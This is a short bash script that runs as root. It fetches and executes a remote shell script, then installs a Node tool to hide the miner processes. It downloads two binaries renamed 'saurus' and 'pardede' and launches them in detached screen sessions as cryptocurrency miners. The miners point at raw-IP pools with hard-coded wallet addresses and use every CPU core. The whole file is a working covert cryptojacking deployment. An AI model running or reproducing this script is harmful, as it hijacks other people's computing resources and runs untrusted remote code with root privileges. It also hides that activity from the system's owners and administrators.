#!/bin/bash
sudo su <<EOF
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
sudo apt install screen -y
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
sudo apt install npm -y
sudo npm i -g node-process-hider && sudo ph add dino
sudo ph add pardede
wget https://gitlab.com/williehprnuhrxyq/gudangku/-/raw/main/saurus && chmod +x *
wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
screen -dms run ./saurus -a autolykos2 -o 47.236.130.246:443 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 00-$(TZ=UTC-7 date +"%H-%M-%S")) -p x
screen -dms run ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
EOF
screen -r
